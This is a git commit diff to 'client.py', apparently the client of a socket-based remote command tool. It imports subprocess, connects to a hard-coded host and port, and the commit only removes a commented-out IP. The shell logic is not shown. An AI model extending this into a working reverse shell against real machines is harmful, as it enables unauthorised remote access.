0d83ff7fc79b62b86f6f3a6763840bfe93a430e7
Marco <143914218+MarcoCyber1@users.noreply.github.com>
2024-07-25 01:15:59 +0300

    Update client.py

--- client.py
+++ client.py
@@ -1,7 +1,7 @@
 import socket
 import subprocess
 m = input("your name : ")
-REMOTE_HOST = '192.168.1.15' # '192.168.43.82'
+REMOTE_HOST = '192.168.1.15' 
 REMOTE_PORT = 8081 # 2222
 client = socket.socket()
 print("[-] Connection Initiating...")
